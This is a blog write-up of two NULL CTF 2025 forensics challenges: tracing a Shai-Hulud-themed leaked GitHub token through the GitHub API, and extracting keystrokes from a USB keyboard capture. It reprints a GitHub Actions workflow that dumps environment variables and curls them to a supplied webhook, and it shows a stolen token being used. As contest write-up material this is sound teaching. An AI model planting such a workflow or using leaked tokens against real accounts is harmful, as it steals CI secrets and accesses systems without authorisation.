---
title: "NULL CTF 2025 - Forensics"
description: "Write-ups of challenges that I solved in NULL CTF 2025 in collaboration with TCP1P Community"
pubDate: "2025-12-07"
heroImage: "/images/nullctf25/logo.png"
---

Write-ups of challenges that I solved in NULL CTF 2025 in collaboration with TCP1P Community. Achieved a full solve in the forensics category.

![](/images/nullctf25/image.png)

## Sandworm Strike

### Description

“The Fremen speak of the great sandworms of Arrakis with reverence. They call them Shai-Hulud, the Old Man of the Desert, and see in them a manifestation of God.”

Note: No attachments is intended. Note 2: The gcloud keys from the sample are not in the target. Please donnot tamper with any GCP instance. Note 3: Not any cloud. AWS, Azure, Alibaba, Vercel, etc.

### Solution

![](/images/nullctf25/sandworm-strike/image.png)

From the description, we know that this challenge references the Shai-Hulud worm that happened recently. However, the difficult part is that there are other versions of this worm that appeared after the challenge was created (as the problem setter mentioned), which became a rabbit hole for those who looked up the worm recently.

![](/images/nullctf25/sandworm-strike/1.png)

So I opened a ticket to ask which version of this worm the challenge refers to, and it's the `first` one.

![](/images/nullctf25/sandworm-strike/2.png)

From the behavior of this worm, we can determine that the compromised data is published in a GitHub repository (ref: https://www.aikido.dev/blog/s1ngularity-nx-attackers-strike-again). The repository description is quite obvious: `Shai-Hulud Repository`, so we can search for it on GitHub based on that description.

![](/images/nullctf25/sandworm-strike/3.png)

The most recent repository is `NiguraKaKuru/Shai-Hulud`. We can start searching from here.

![](/images/nullctf25/sandworm-strike/11.png)

The repository contains only `data.json` encoded with nested base64, which means this repository was indeed compromised.

![](/images/nullctf25/sandworm-strike/12.png)

After decoding, we obtained some data that mostly contains npm environment variables. However, there is one particularly interesting thing: a `github token`. 

![](/images/nullctf25/sandworm-strike/4.png)

With this token, we can fetch https://api.github.com/user/repos along with the header `Authorization: token <found token>`. Another tricky part is that the Shai-Hulud repository is being committed constantly, so we need to get the freshest commit to obtain the valid token.

![](/images/nullctf25/sandworm-strike/5.png)

After fetching it, we discover a private repository. For further analysis, we clone it.

```yml
on:
  workflow_dispatch:
    inputs:
      webhook_url:
        type: string
        description: Who to greet
        required: true

jobs:
  exfiltrate-environment:
    runs-on: ubuntu-latest
    env:
      FLAG: ${{ secrets.FLAG }}
      WEBHOOK_URL: ${{ inputs.webhook_url }}
    steps:
      - name: Send FLAG to webhook
        run: |
          env | sort > env_dump.txt
          curl -X POST \
            -T env_dump.txt \
            "$WEBHOOK_URL"
```

With the repository cloned, there is a file `shai-hulud-migration.yml` in `.github/workflows`. As developers, we know this is a CI/CD workflow for GitHub Actions. The workflow does the following:
1. Asks the creator to input a webhook URL
2. Writes environment variables to `env_dump.txt`
3. Sends `env_dump.txt` to the webhook URL

![](/images/nullctf25/sandworm-strike/6.png)

From here, our target is clear: we need to obtain the webhook URL. Using the GitHub API again, we can fetch the executed CI/CD runs from https://api.github.com/repos/username/big-money-project/actions/runs along with the token we found earlier.

![](/images/nullctf25/sandworm-strike/7.png)

The response from GitHub returns the ID of the workflow file we found earlier. Then we fetch the logs with https://api.github.com/repos/NiguraKaKuru/big-money-project/actions/runs/20005709902/logs to see the CI/CD process logs. From the response, we get a base64-encoded string. After decoding it, we obtain a zip file. However, it turns out to be another rabbit hole 😡.

![](/images/nullctf25/sandworm-strike/8.png)

But we don't give up. Diving into the commit log, there is a commit that mentions `shai-hulud-migration.yml`, the same file we found initially.

![](/images/nullctf25/sandworm-strike/9.png)

It was committed on the third run, so we can acquire the ID and fetch it using the same method as before. And FINALLY, it shows the webhook URL. Opening it reveals the POST request with the flag.

![](/images/nullctf25/sandworm-strike/10.png)

### Flag
nullctf{$h41_hu1ud_c0n$um3$_y0ur_$3cr37$}

## iuesbitaipsi

### Description

ayay uat is iuor taip for iuesbi?

### Solution

We are given a pcapng file that captures USB traffic from a device.

![](/images/nullctf25/usb/image.png)

Upon analysis, the first packet is the Device Descriptor request and response. We can get the device information from the packet labeled `GET Descriptor Response Configuration`.

![](/images/nullctf25/usb/1.png)

The data payload tells us that this is a `Keyboard` Device.

![](/images/nullctf25/usb/2.png)

Since we now know that these are captured keyboard packets, we can extract the data that was inputted using [usb-keyboard-parser](https://github.com/TeamRocketIst/ctf-usb-keyboard-parser). Running this tool gives us the flag.

### Flag
nullctf{4nd_7h47s_h0w_4_k3yl0gg3r_w0rks}